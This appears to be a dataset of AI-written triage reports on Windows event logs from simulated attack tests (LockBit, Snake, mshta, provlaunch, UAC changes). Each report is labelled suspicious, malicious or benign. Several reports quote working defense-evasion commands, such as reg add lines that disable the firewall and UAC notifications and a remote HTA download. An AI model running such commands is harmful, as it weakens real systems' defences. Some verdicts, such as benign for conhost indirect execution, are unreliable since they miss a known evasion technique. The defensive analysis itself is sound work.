- However, there's an instance of `powershell.exe` being used to set a registry key (`New-ItemProperty -Path ""HKCU\\Software\\Policies\\Microsoft\\Windows\\System"" -Name DisableCMD -Value 1`). This command effectively disables the Command Prompt for the user, which could be executed for a legitimate administrative purpose (to restrict access) or potentially for evasion tactics if initiated by an unauthorized user.

#### 2. Potentially Suspicious Log Entry:
- The aforementioned PowerShell command is suspicious due to its capacity to modify user policies, especially since such changes are often administratively controlled.
- No direct evidence in the logs points to how this command was initiated or who authorized it, other than it being executed under `admin_test`.

#### 3. Review of Logon and Security Events:
- The security log events (`4624`, `4672`) show successful logons of the SYSTEM user, a standard operation.
- Security event `4616` shows a time change by `LOCAL SERVICE`, which could be concerning in terms of time tampering but is often normal behavior for syncing with an NTP time source.

#### 4. Browsing Application and System Logs:
- The application logs primarily show service starts and stops related to EdgeUpdate, which align with regular update processes.
- The system logs discuss time synchronization events and standard kernel messages, which generally indicate regular system operation.

### Assessment of the Situation:
- A majority of the logged activity falls within the realm of expected administrator actions or standard system operations.
- The key item of interest is the PowerShell command modifying the registry's `DisableCMD` value. The context of its use (whether authorized for policy control or unintended modification) makes it crucial to verify with authorized personnel or logs not provided here.

### Resolution:
- **SUSPICIOUS**: Given the absence of context around the purpose of disabling CMD via PowerShell, this is classified as suspicious activity. More investigation is warranted to ascertain the intent and necessity of this registry modification. Verify with system administrators or change management records to decide if this was a sanctioned operation.

### Guidance on How to Proceed:
1. **Validate Configuration Change:** Confirm with the IT administration team whether the `PowerShell` command execution for disabling CMD was an approved and documented change.
2. **Log Additional Context:** Look for surrounding logs to understand who initiated the PowerShell-based command and from where, as this can provide insights into whether it was instigated externally.
3. **Monitor and Alert:** Set up alerts for PowerShell usage for policy changes and registry modifications of critical settings that may impact security configurations.
4. **User Training and Awareness:** Reinforce training for privileged account users about identifying legitimate and suspect administrative tasks to avoid potential misuse or error."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"In analyzing the provided logs, here's a detailed breakdown of the potential issues and activities observed:

### Security Logs:
1. **Events 4616**: These events represent time changes on the system made by the process `svchost.exe` under the context of ""LOCAL SERVICE"". Generally, time synchronization through `svchost.exe` is normal; however, time discrepancies can sometimes indicate malicious activity if altered commands are detected. In this case, the logs show consistent updates and remain benign as no further correlational suspicious activities are tied.

### Application Logs:
1. **EdgeUpdate Service Events**: The events indicate normal stopping and starting of Microsoft Edge Update service activities. Typically, such activity is benign, especially if it's noted during patch cycles. However, repetitive stops and starts can be monitored in continuous logs over time for abnormalities.

### Sysmon Logs:
1. **Frequent `wevtutil.exe` Usage**: There is extensive usage of `wevtutil.exe` and `conhost.exe`. While the use of `wevtutil.exe` can show normal log management activities, frequent usage by a non-default admin, `admin_test`, within a short period should be noted. This could potentially be suspicious if not part of expected administrative tasks.
2. **Command Execution (`cmd.exe`)**: A process with command execution `cmd.exe` is observed to add a registry policy (`DisablePrivacyExperience`). Such modifications aren't immediately dangerous but can be indicative of an admin script or maintenance task. Given the integrity level ""High"" for the user `admin_test`, this could be standard administrative operation unless otherwise unauthorized.
3. **Whoami and Hostname Commands**: The `whoami.exe` and `hostname.exe` processes running could indicate a benign user querying system information.

### System Logs:
- **Time Adjustments**: Log records indicate valid time synchronization-related actions via `svchost.exe`. This isn't inherently suspicious in isolated events.

### Overall Insights:
- The logs do not immediately highlight any clearly identified malicious activity. The actions observed can be aligned with typical update and administrative tasks. However, the logs do suggest the need for verification of admin tasks originating from the user `admin_test` to ensure there is no unauthorized use or automation.

### Findings:
Based on the above observations, while a few activities bear noting for further audit trails (particularly concerning administrative log-related utilities), there are no 100% malicious indicators present in the logs provided, leading to the following conclusion:

### Resolution: SUSPICIOUS
- If `admin_test` activities align with unauthorized actions not consistent with typical operational procedures, an internal review or further log continuity shall be advised to ensure no overlooked compromise.
- Monitoring subsequent changes to registry settings or unusual time adjustments may help in early identification of any potential threats.

Guidance moving forward would encompass confirming the legitimacy of actions undertaken by `admin_test`, ensuring the security patch processes are accurately aligned with the organizations' procedures, and maintaining procedural controls and oversight of elevated privilege usage, particularly over the short time frames noted."
LockBit Black - Unusual Windows firewall registry modification -cmd,"### Analysis of Windows Event Logs

Upon review of the provided Windows event logs, the following findings have been identified:

#### 1. Command Line and Registry Key Modification
- **Event ID 1**: A `cmd.exe` process executed with a command involving registry modification. Specifically, the command altered registry keys to disable the Windows Firewall for both the Domain and Standard profiles:
  ```plaintext
  ""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f & reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
  ```
  - **Interpretation**: Disabling the firewall is a common tactic used by malicious actors to ease lateral movement and exfiltration of data. 

#### 2. Privilege Escalation
- **Security Event ID 4672**: The `admin_test` account was granted a set of privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`. These privileges provide significant control over system security, often useful for malicious purposes.

#### 3. Execution of System Utility Programs
- **Sysmon Event ID 5**: Numerous executions of system utilities such as `wevtutil.exe`, `whoami.exe`, and `conhost.exe`. While `wevtutil.exe` is often used benignly to query and manage event logs, a pattern of these processes executing could suggest attempts to cover tracks or gather system information maliciously.

#### 4. Network Connection Event
- **Security Event ID 4624**: Network logons were recorded using NTLM from a workstation named `DESKTOP-3HL5B2P`. This could indicate remote connections which, when combined with administrative privilege escalation and lack of context in authorized actions, raises a flag for potentially unauthorized access.

#### 5. Edge Update Activity
- **Sysmon and Application Logs**: Multiple instances of `MicrosoftEdgeUpdate.exe` and associated processes. While Edge updates are normal, there was extraction to temporary directories, which could be a benign side-effect of installation processes, though without clear further context, it deserves verification to ensure it's authorized.

### Recommendations:

1. **Immediate Review and Action**:
   - Investigate the 'admin_test' account for any unauthorized use. Consider resetting the account’s credentials and reviewing recent activity from this account.
   - Analyze the context and authorization of the registry key modifications disabling firewall profiles. If unauthorized, re-enable the firewall policies immediately.
   
2. **Network and System Monitoring**:
   - Review network traffic logs for unusual patterns correlating with the NTLM logon events.
   - Monitor for further occurrences of system utilities executed unexpectedly.

3. **Further Threat Hunting**:
   - Implement systems to alert on unexpected modification of security policies, especially those disabling protective features such as the firewall.
   - Deploy additional endpoint protection policies to catch unauthorized elevation of privileges and suspicious process executions.

### Conclusion:

Given these findings, the activity observed within the logs is best classified as **SUSPICIOUS**. It warrants further investigation, particularly around the disabling of firewalls and network log successful events. Immediate mitigation and review steps should be considered to secure the environment from potential malicious activity."
InstallUtil evasive invocation,"Upon analyzing the provided Windows event logs, several points of interest and potentially suspicious activities are evident:

1. **PowerShell Execution with Unexpected Commands**:
   - Notably, the logs reveal multiple instances of PowerShell being executed with command lines that suggest the execution of a script intended to perform actions with InstallUtil.exe by renaming it to notepad.exe in the `C:\Windows\System32\Tasks\` directory. This is suspicious as InstallUtil is a tool provided by Microsoft but can be exploited to bypass traditional security controls and execute malicious payloads using the so-called ""living off the land"" technique.

2. **Unusual Process Creations and Command Line Arguments**:
   - Processes like `csc.exe` and `cvtres.exe` from the .NET Framework are involved, which are typically used in development but may be leveraged by attackers for malicious purposes like compiling and executing code on the target system.
   - The logs also show execution of processes like `wevtutil.exe` and `hostname.exe`, which although benign on their own, in this context—following the suspicious PowerShell activities—could indicate enumeration actions or activities attempting to alter event logs.

3. **High Integrity Level Execution**:
   - The processes are running with a ""High"" integrity level, suggesting they have elevated privileges, which is often an element leveraged in attempts to conduct privilege escalation or run unauthorized tasks on the system.

4. **Unusual Parent-Child Process Relationships**:
   - Several command executions reflect unusual and potentially unauthorized parent-child relationships which further suggests the orchestration of typically administrative tasks by unconventional means or malicious scripts.

5. **Logon Events and Privileged Use**:
   - Security logs indicate privileged operations (Event ID 4672) that correspond with SYSTEM-level processes, which is standard but still worrisome when observed concurrently with other suspicious activities.

6. **Network Service and SYSTEM Privilege Utilization**:
   - Multiple instances indicate operations by NT AUTHORITY's NETWORK SERVICE and SYSTEM accounts, which are normal under legitimate system updates and background processes but are flagged as needing attention due to the coinciding unusual PowerShell activity.

### Assessment:

The logs contain evidence of potentially **MALICIOUS** activity, particularly given the staging of PowerShell commands attempting to use InstallUtil in a manner consistent with known exploitation techniques. This behavior, alongside the elevated privilege execution and anomalous process relationships, is highly indicative of a threat actor's attempt to execute unauthorized code and possibly cover tracks by tampering with logs. 

### Guidance:

1. **Immediate Incident Response**: Initiate a thorough incident response to contain and mitigate potential threats. This includes terminating suspicious processes, preventing further unauthorized access, and removing any implanted scripts or binaries.
   
2. **Detailed Investigation**: Perform a deeper analysis on the `Server002` to identify compromised accounts, configurations, or systems. This includes reviewing related network traffic, access patterns, and other servers connected to this host.

3. **Threat Hunting and Retrospective Analysis**: Conduct broader threat hunting activities to check for similar patterns across the network environment to avoid any lateral movement from the attacker.

4. **System Hardening and Monitoring**: Enhance monitoring protocols on administrative tools like PowerShell and InstallUtil. Implement strict execution policies and user awareness programs to recognize and report suspicious activity promptly.

5. **Review and Update Security Policies**: Ensure that file integrity monitoring, event log integrity checks, and alerting mechanisms are up-to-date and robust against threats exploiting native tools for malicious activities.

The indicators in the logs demand a cautious but swift response to confirm, handle, and prevent further malicious harm."
Snake Malware Encrypted crmlog file,"### Detailed Analysis of the Logs

Upon reviewing the Sysmon, Powershell, WindowsUpdateClient, and Security logs for the host Server002, the following observations have been made:

#### 1. Use of PowerShell
- There are numerous instances of PowerShell execution via the `powershell.exe` process. In particular, a PowerShell script is launched with the command invoking `New-Item` to create a file in the Windows directory with hidden, system, and archive attributes. This command is notable:
  ```powershell
  ""powershell.exe"" & { $file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host ""File created: $($file.FullName)"" }
  ```
- This behavior can often be associated with persistence mechanisms or data exfiltration preparations by malicious software.

#### 2. Process Execution Patterns
- Multiple executions of standard Windows binaries such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` are observed. The presence of `wevtutil.exe` is especially notable as it is often used for interacting with event logs, which can be abused to clear tracks or gather information.
- These executors are invoked under the `SERVER002\admin_test` user, with high integrity levels, suggesting administrative privileges possibly leveraged for unauthorized operations.

#### 3. Windows Update Activities
- The presence of Windows Update Client activity updating Microsoft Defender Antivirus definitions suggests routine system maintenance related to security updates.

#### 4. Security Logs
- A sequence of Security-Auditing logs, involving Event ID 5379, which relates to credential fetch activities, shows repeated ""ReturnCode"" values indicating potential credential access attempts. However, these events mostly have return codes that denote unsuccessful operations.

### Assessment, Threats, and Risks
Given the analysis:

- **Suspicious Behavior**: The use of PowerShell to modify critical file attributes and the context (`admin_test` user and high integrity) warrant further investigation. The PowerShell command provided could indicate preparation for malicious activity, often seen in lateral movements or persistence establishment.
  
- **Benign or Regular System Operations**: The use of typical Windows binaries such as `wevtutil.exe` and `whoami.exe`, though under suspicious circumstances, does not inherently confirm malicious activity, as these tools have legitimate administrative uses.

- **Updates and Security Logs**: The Windows Defender updates and credential access logs do not present immediate threats given the absence of successful unauthorized credential use.

### Recommended Resolution: **SUSPICIOUS**

- The activity captured in the logs cannot be definitively deemed malicious without further investigation. The PowerShell command and the high-privilege context suggest a need for closer examination.
- **Next Steps**: Initiate a deeper forensic investigation into the `admin_test` user's activities, particularly focusing on how and why such PowerShell commands were executed. Evaluate the legitimacy of the file operations and confirm any necessary correlation with legitimate tasks or authorized administrative scripts. Monitoring further activity and incorporating broader log data (if available) could aid in assessing the intent and scope.
"
Set a firewall rule using New-NetFirewallRule,"**Detailed Analysis:**

Upon analyzing the provided Windows event logs across various categories (System, Sysmon, Application, PowerShell, Security), a few points of interest emerge that warrant closer scrutiny.

1. **Time Modification Events:**
   - **System Log & Security Log:** The logs indicate a modification of system time using `svchost.exe` (example EventID 24 in System and EventID 4616 in Security). These changes were made by a process with `ProcessId 0x2F0` and executed by `LOCAL SERVICE`. Time modification is typically associated with attempts to manipulate log data or evade detection and thus should be examined.

2. **Suspicious PowerShell Usage:**
   - **Sysmon & PowerShell Logs:** There is notable PowerShell activity involved with creating a new firewall rule to allow inbound traffic on port 21 (FTP) using `New-NetFirewallRule`. This could indicate an attempt to open a port for unauthorized access, which is potentially dangerous, especially if it wasn't part of an authorized configuration or change management process. The event recorded lists the `hostapplication` and the command being executed. While PowerShell is a legitimate administrative tool, its use with such settings should be thoroughly verified against current administrative actions.

3. **Frequent `wevtutil.exe` and `conhost.exe` Execution:**
   - **Sysmon Log:** The log shows frequent executions of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. `wevtutil.exe` is used for event log management, and excessive activity without clear administrative purpose might indicate an attempt to clear or modify logs (potentially covering tracks).

4. **EdgeUpdate Activity:**
   - **Sysmon Log:** Numerous entries relate to Microsoft Edge Update processes. While the entries appear normal as part of update procedures, they should still be verified to ensure they align with expected update schedules.

**Assessment and Recommendations:**

- **Suspicious Behavior Noted:** The combination of time alteration, potentially unauthorized PowerShell command execution, and the numerous invocations of event utility processes indicates suspicious activity that could relate to system compromise efforts.
  
  **Resolution: SUSPICIOUS**

  - **Actions to Consider:**
    1. Review administrative policies and user activities, especially concerning time changes and PowerShell commands.
    2. Verify whether the firewall rule change was authorized by checking with network security or change management personnel.
    3. Conduct a thorough review of user `SERVER002\admin_test`'s recent activities to determine if they were legitimate.
    4. Check for any unauthorized access attempts or data exfiltration signs on the network during the timeframe.
    5. Ensure event logs are being securely archived and regularly reviewed to prevent unauthorized clearing or tampering.

Further investigation based on this suspicious activity can confirm or dismiss the presence of a true compromise, potentially escalating the situation to a security incident response if necessary."
Disable Windows OS Auto Update,"Upon reviewing the provided Windows event logs, several observations can be made:

1. **Time Change:** The Security log shows Event ID 4616, indicating a change in system time by the ""svchost.exe"" process. This could be an administrative change or part of a normal service adjustment like time synchronization.

2. **System and Kernel Logs:** The System log indicates updates in time and timezone settings, aligning with the Windows Time Service synchronizing the system clock with an NTP server (Event ID 35). This is typical behavior for network-connected servers to maintain time accuracy.

3. **Edge Updates:** The Sysmon log contains multiple instances of processes related to ""MicrosoftEdgeUpdate.exe"" and its components. The consistent logging of these processes, including updates and service calls, points towards a routine update or check by the Microsoft Edge browser update service. This is normally scheduled by the system to ensure software is up-to-date.

4. **Registry Modification:** Notably, the Sysmon log contains an entry where ""cmd.exe"" executes a modification to the registry key associated with Windows Updates to disable automatic updates (through ""reg.exe""). This action is executed by the user ""SERVER002\admin_test"" and is using a high integrity level. This kind of modification can be a part of administrative maintenance but warrants further investigation to verify whether it was an authorized action.

5. **Command Execution:** Execution of command-line utilities like ""wevtutil.exe,"" ""conhost.exe,"" ""whoami.exe,"" and ""cmd.exe"" are logged alongside Microsoft Edge updates. These processes appear to originate from an authorized user account and are possibly related to administrative scripts or regular maintenance.

Based on the analysis:

- There are no definitive signs of malicious activity. The logs reflect a combination of routine system updates, time synchronization, and some administrative actions. 
- The disabling of Windows automatic updates through registry change needs verification for authorization but isn't in itself inherently malicious.

**Resolution:**  
- **SUSPICIOUS** - The registry manipulation to disable automatic updates, while potentially benign, should be confirmed as an authorized action by IT administration. Therefore, it warrants further investigation to ensure it was conducted correctly and with proper intent."
Windows Add Registry Value to Load Service in Safe Mode with Network,"### Analysis of Provided Windows Event Logs

#### Sysmon Log Analysis:

1. **Multiple Use of `wevtutil.exe` and `conhost.exe`:**
   - The Sysmon log shows repeated execution of `wevtutil.exe` paired with `conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` utility is used for Windows Event Log management, which can be legitimate; however, its repetitive use in a short period without clear reason may be suspect as it could indicate attempts to manipulate or enumerate the event logs.
   - `conhost.exe` is a legitimate Windows utility related to console windows, commonly associated with cmd.exe sessions. Its presence together with `wevtutil.exe` may suggest attempts to run script-based management or changes to the events.

2. **Execution of `cmd.exe` with Registry Modification:**
   - The log records the execution of `cmd.exe` with a command that adds a SafeBoot registry key using `reg.exe`.
   - This behavior indicates a registry modification, potentially attempting to alter system boot settings for Safe Mode. Modifying SafeBoot parameters is a suspicious action that might be used to maintain persistence or ensure certain services start in recovery modes.

3. **Frequent Execution of System Utilities:**
   - The execution of utilities like `hostname.exe`, `whoami.exe`, etc., could suggest enumeration activities typical of malicious behavior, although used by `SERVER002\admin_test`.

4. **Edge Update Executions:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are observed, performing various update actions. As it’s running under `NT AUTHORITY\SYSTEM`, this is normal behavior for Microsoft Edge updates, though its frequency should be checked against normal update schedules to confirm legitimacy.

#### System Log Analysis:

- The system log entries primarily contain typical kernel operations, including time changes which reflect standard system clock adjustments. There are no suspicious indicators or anomalies that directly suggest malicious action beyond the observed behavior in the Sysmon logs.

#### Security Log Analysis:

- Logon events show activity by `admin_test`, associating it with privileged rights including `SeDebugPrivilege`. These are typical for administrative users but could pose risks if the account is compromised. 

#### Application Log Analysis:

- The entries related to Edge Update only indicate service stop messages, which can happen during updates or shutdowns and do not immediately point to malicious activity.

### Conclusion:

Based on the analysis of the log entries provided, there is no explicit evidence of active malware on the system. However, certain behaviors — such as repeated use of `wevtutil.exe` and registry changes via `cmd.exe` — warrant further inspection to rule out potentially harmful intentions or misconfigurations.

### Final Assessment:
- **Resolution:** **SUSPICIOUS**
- **Recommendations:**
  - Investigate the purpose of the registry change executed via `cmd.exe` to ensure it aligns with company policy or user task requirements.
  - Review the user account `admin_test` for potentially unauthorized access or unusual behaviors beyond standard administrative tasks.
  - Monitor and verify the frequency and timing of the Microsoft Edge Update for consistency with known update patterns.
  - Ensure proper logging and monitoring mechanisms are in place to detect similar patterns in the future. 

Additional investigation into user activity, particularly the context of `wevtutil.exe` executions and the registry modification, would help confirm or dismiss current suspicions."
Create Windows Hidden File with powershell,"Upon analyzing the provided Windows event logs, here's the breakdown of findings:

### Application Log
- **Event 2386**: Indicates an operation related to the Software Protection Platform, which appears normal for a system process.
- **Event 2387**: Shows an Edge update service stopped, which aligns with typical application update behavior.

### Sysmon Log
- Records show multiple instances of usage of `cmd.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe`, all executed by the user `SERVER002\admin_test` with high integrity levels.
- Notably, the operations involving `cmd.exe` are reminiscent of benign scripting or maintenance tasks, although repeated checking and writing (`IF EXIST` and `echo`) of `data.txt` in `%temp%` directory with high integrity are slightly unusual but not necessarily malicious.
- **Processes like `wevtutil.exe`** are utilities used for event logs. While frequent usage by a non-system user can be suspicious in another context, it may simply relate to regular log file manipulations or maintenance scripts.
- **PowerShell Usage**: Elevates the attributes of a file (`data.txt`) to 'hidden', which is typically non-malicious unless tied to a broader context of obfuscation or data exfiltration.

### PowerShell Log
- Confirms the PowerShell command execution to change the file attributes of `data.txt` to 'hidden'. The execution context does not indicate immediate malicious intent without additional indicators.

### Security and System Logs
- These logs are empty. This lack of records is unusual, as it might signify an issue with log forwarding or a deliberate cleansing which requires further scrutiny.

### Assessment
- **Benign Behaviors**: The overall execution of Windows utilities (e.g., `whoami.exe`, `hostname.exe`) aligns with routine checks often scripted for network or system diagnostics.
- **Anomalies Worth Noting**: Repeated usage of high-integrity `cmd.exe` and concealment of files could necessitate further inspection for any scripts running under `SERVER002\admin_test`.
- **Concealed Suspicion**: Combination of PowerShell and commands to change file attributes without proper documentation/authorization could indicate intentions to obscure actions, though this is common in legitimate administrative practices too.
  
### Guidance
1. **Review Scripts/Tasks**: Verify if these command lines align with authorized scripts or scheduled tasks. Adjustments may be needed for documentation or practice improvements.
2. **User Activity Audit**: Evaluate `SERVER002\admin_test` activities for legitimacy by reviewing access logs or interviewing the user.
3. **Security Enhancements**: Consider instituting stricter logging and monitoring practices, such as forwarding to centralized log management systems to ensure visibility into Security and System logs.

### Resolution
Given the data at hand, the activities do not conclusively exhibit malicious characteristics but contain elements that warrant closer inspection to ensure security posture:

**Resolution: SUSPICIOUS**"
Invoke HTML Application - Direct download from URI,"### Analysis of the Logs

Based on the provided PowerShell and Sysmon logs, I've identified several patterns and events that indicate potential malicious activity:

#### Suspicious PowerShell Activity
1. **PowerShell Command Execution**: 
   - The PowerShell logs indicate the execution of a command using `powershell.exe` with a script block `{Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/file/file-file/...}`. This command is accessing an external URI on GitHub, which is a potential indicator of a script or payload being fetched from an untrusted source.

2. **HTA File Execution**:
   - The command executed seems to be downloading and executing an HTA (HTML Application) file using `mshta.exe`. Execution of remote or local HTA files can often be used to execute scripts in a manner similar to malware.

3. **Use of `mshta.exe`**:
   - The use of `mshta.exe` to execute content from a remote server is a common technique used by attackers to bypass traditional detection mechanisms and execute malicious scripts.

#### Sysmon Logs Indications
1. **High Integrity Level**:
   - The processes related to PowerShell and `mshta.exe` have a high integrity level, meaning they have considerable permissions on the system. This can lead to elevated risks if the scripts are malicious.

2. **Parent-Child Process Relationships**:
   - The PowerShell and HTA execution involves processes like `wsmprovhost.exe`, which is typically a legitimate Windows management process. However, in this context, it might be involved in potentially malicious behavior due to the parentage and timing in the logs.

3. **Frequent Process Creation**:
   - There are a series of process creations where typical command-line utilities (`whoami.exe`, `hostname.exe`, `conhost.exe`) are spawned in quick succession with PowerShell as a parent process, suggesting enumeration or preparation for further actions. 

### Assessment and Resolution

Given the details outlined above, the activity captured in these logs does not exhibit characteristics of standard, benign operations and bears resemblance to scripts attempting to execute unauthorized actions, potentially deploying or fetching additional malicious payloads.

- **Indicators of Compromise** (IOCs) such as fetching remote scripts and using `mshta.exe` increase the risk of a compromise.
- **Unknown HTA File**: The HTA file executed remotely is not a standard operation and is often seen in attacks.

### Final Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Isolation**:
   - Isolate `Server002` from the network to prevent any potential spread of the malicious payload.

2. **Forensic Analysis**:
   - Conduct a deeper forensic investigation to determine the extent of compromise and any changes made by the potential script execution.

3. **Review and Block Network Traffic**:
   - Block the URL accessed in the PowerShell command and review firewall and proxy settings for any other similar connections.

4. **Patch and Update**:
   - Ensure that all systems, especially those showing this behavior, are patched with the latest security updates.

5. **User Training and Awareness**:
   - Educate users about the risks associated with executing or downloading external scripts and the use of unauthorized scripts on company infrastructure.

Further actions could include checking for persistence mechanisms and other hosts that may have executed similar scripts."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"Upon reviewing the provided logs, here is a detailed analysis considering suspicious behaviors such as unusual process execution, command-line arguments, privilege escalation, or any other signs of potential compromise:

### Analysis:

1. **Application Log:**
   - The `edgeupdate` service stopped twice within a span of a few seconds. This alone is not inherently suspicious as services can stop and start frequently due to updates or system maintenance tasks.

2. **Sysmon Log:**
   - There are several executions of `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` user. The use of `wevtutil.exe` could be regular system maintenance or log management, but it’s worth noting as it can be used for malicious purposes such as clearing event logs.
   - Notably, there is an execution of `cmd.exe` with a command line that involves using `reg.exe` to modify the registry and executing `calc.exe` via `provlaunch.exe`. This behavior resembles a use of Living-off-the-Land Binaries (LOLBins), leveraging legitimate system utilities to perform potentially harmful operations. While the use of `calc.exe` itself is not directly harmful, it often appears in testing scenarios or as part of a broader attack mechanism.
   - Various Edge updates are happening under `NT AUTHORITY\SYSTEM` which is expected for system updates.

3. **Security Log:**
   - Contains time change events (Event ID 4616) which might be linked to time synchronization operations and are normal when conducted by authorized services such as `svchost.exe`.

4. **System Log:**
   - The logs show time synchronization with `time.windows.com`. The kernel logs indicate time changes which align with expected system behavior; no immediate red flags are present.

### Conclusion:

The primary area of concern is the suspicious use of `cmd.exe` to adjust registry settings and execute `calc.exe`. This is consistent with methods used in some forms of attack where LOLBins are exploited to evade detection by appearing as legitimate operations.

### Resolution:
Given the observations above, the activity within these logs should be categorized as **SUSPICIOUS**. The execution pattern of `cmd.exe`, `reg.exe`, and subsequent use of system tools to execute seemingly benign applications like `calc.exe` raises enough concern to warrant further investigation. It’s advised to:
- Conduct a closer examination of the `admin_test` account's activities.
- Investigate any additional changes to the registry or system configuration.
- Review the broader context and interactions of these processes, especially around the same timestamps to determine if it fits within any broader attack patterns.
- Verify with system owners or logs if these commands were initiated through legitimate administrative tasks or scripts.

A more in-depth investigation could reveal whether this activity is benign or indicative of a malicious act."
Lolbin Gpscript startup option,"Upon analysis of the provided logs, the following observations were made:

### Security Log
- The two EventID 4616 logs pertain to changes in system time, executed by the `svchost.exe` process under the `LOCAL SERVICE` account. While time changes can sometimes indicate malicious activity, these events alone are not sufficient to conclude malicious intent without additional context.

### Application Log
- The entries related to `edgeupdate` are classified as level 4, which typically indicates informational messages. The ""Service stopped"" messages do not raise immediate concern without additional context.

### Sysmon Log
- A number of processes were executed by the user `SERVER002\admin_test`, including `whoami.exe`, `hostname.exe`, and `cmd.exe`, which executed command-line operations. The command-line usage of `cmd.exe` with `/c Gpscript /startup` can be considered unusual, but it's not explicitly malicious.
- Multiple instances of `MicrosoftEdgeUpdate.exe` running with different command-line arguments (e.g., /update, /svc, /ping, /regsvc) in rapid succession indicate a process related to Microsoft Edge updating.
- The majority of Edge Update processes are running as `NT AUTHORITY\SYSTEM`, which is expected since updates usually require elevated privileges for installation or servicing.

### Summary
- **Unusual Behavior**: Frequent and rapid execution of Microsoft Edge Update processes with various command-line options is noted, though updates can frequently trigger such events.
- **Potential Concern**: The usage of `cmd.exe /c Gpscript /startup` by `SERVER002\admin_test` could be indicative of a script execution, potentially tied to system or user-specific startup tasks. Further validation is recommended to ensure this aligns with expected administrative operations.
  
### Final Resolution
Based on the information provided:

- **Resolution**: **SUSPICIOUS**

**Reason**: While most activities appear consistent with routine maintenance operations (e.g., Edge updates), the behavior should be classified as suspicious due to the unusual command-line argument usage by `cmd.exe`.

### Guidance
- Cross-reference the `cmd.exe /c Gpscript /startup` execution with known administrative tasks or group policies to validate its legitimacy.
- If the command-line execution of `cmd.exe` is not recognized, further investigation is warranted to trace the origin and purpose of this command. Consider reviewing group policy changes and consult with the administrative team for clarity.
- Continuously monitor subsequent event logs to ensure no further suspicious activity is detected."
Disable UAC notification via registry keys,"Upon reviewing the provided logs, I observe the following:

1. **System and Security Logs:**
   - The logs primarily involve time synchronization and updates to Windows time settings. This is generally benign and expected behavior for a server, as time synchronization with NTP servers is common for ensuring correct system times.

2. **Sysmon Logs:**
   - There are several instances of legitimate Windows processes such as `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` being executed by the user `SERVER002\admin_test`. The execution commands like `whoami` and `cmd.exe` suggest administrative tasks or script execution, likely for system administration or configuration checks.
   - Notably, there is a specific command executed by `cmd.exe`: `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f`. This command modifies the Windows registry to change User Account Control (UAC) settings, which can potentially suppress security prompts. This action is typically unusual in routine operations and could be used to establish persistence or evade normal security prompts.
   - Additionally, the sequence of processes executed around `cmd.exe` involving `reg.exe` shows an explicit modification of the registry. This should be investigated to ensure it is authorized.

3. **Application Logs:**
   - The events are related to the `Microsoft-Windows-Security-SPP` and `edgeupdate`. They indicate routine updates and operations concerning the Windows Software Protection Platform and Microsoft Edge update service. These actions are generally benign and part of regular system operations for keeping software up-to-date.

4. **Conclusion:**
   - The usage of system utilities (`whoami`, `cmd.exe`, `reg.exe`) in close sequence, specifically with a command altering UAC settings, raises potential red flags. While these might be part of administrative scripts or actions taken by the administrator, it’s important to verify whether this was an expected change by comparing with the usual patterns and methods used by your administrative scripts or IT policies.

**Resolution: SUSPICIOUS**

**Recommendations:**
- **Validate** the recent administrative tasks: Check if there were any IT maintenance or upgrades that were supposed to suppress UAC or modify registry settings around the given timestamps.
- **Cross-reference** with user activity logs to verify that the actions were performed by authorized personnel.
- **Review policies** on allowing registry and UAC changes via automated scripts or manual interventions by admins, ensuring these comply with security standards.
- **Monitor** for any additional unauthorized modifications or executions that could indicate an attempted privilege escalation or system compromise."
Indirect Command Execution - conhost.exe,"### Log Analysis:

#### Overview:
Upon examining the provided logs, the key focus areas include:
1. **Security Events**: Two 4616 events related to time changes by `svchost.exe`.
2. **Sysmon Events**: Multiple process creation events predominantly involving routine Windows and Microsoft Edge Update processes.
3. **System and Application Logs**: Indicate routine operations with no overt anomalies.

#### Key Observations:
1. **Time Change Events (Security Log EventID 4616)**:
   - Security EventID 4616 indicates a change in system time by `svchost.exe`. This is typically benign when performed by system services such as W32Time service. The user context is `LOCAL SERVICE`, which aligns with expected behavior for time service activities. 
   - Instances show minimal time adjustments, suggesting possible synchronization rather than arbitrary changes.

2. **Sysmon Logs**:
   - **Process Creation Events**: The execution of `whoami.exe`, `cmd.exe /c conhost.exe ""notepad.exe""`, and various `notepad.exe` instances initiated by `cmd.exe` are seen.
   - Command usage such as `whoami` and `cmd.exe` with parameters are normal in managed environments for administrative tasks. However, `cmd.exe` spawning `conhost.exe` with ""notepad.exe"" may indicate script or administrative task inconsistency or automation use.
   - **Microsoft Edge Update Process**: The multiple Sysmon logs demonstrate the regular update activities of Microsoft Edge components. Given the nature of the entries, including file versioning and associated SHA256 hashes, this appears routine and matches expected update activity.

3. **Application and System Logs**:
   - Mostly comprise regular service starts or stops, including `edgeupdate` service notifications, aligning with expected application behavior.

### Conclusion:

**Assessment**:
- While there are logs indicating administrative command execution (`whoami`, `cmd.exe`), and multiple regular Edge update executions, there is no definitive evidence of malicious activity. 
- The logs reflect anticipated system operations, including time synchronization and application updates.

**Resolution**: **BENIGN**

### Recommended Actions:
1. **Continue Monitoring**: Regular monitoring should remain in place; investigate further if encountering unexpected system process modifications or anomalous behavior.
2. **User Awareness**: Educate users on typical administrative command impacts to avoid confusion over legitimate vs. unauthorized use.

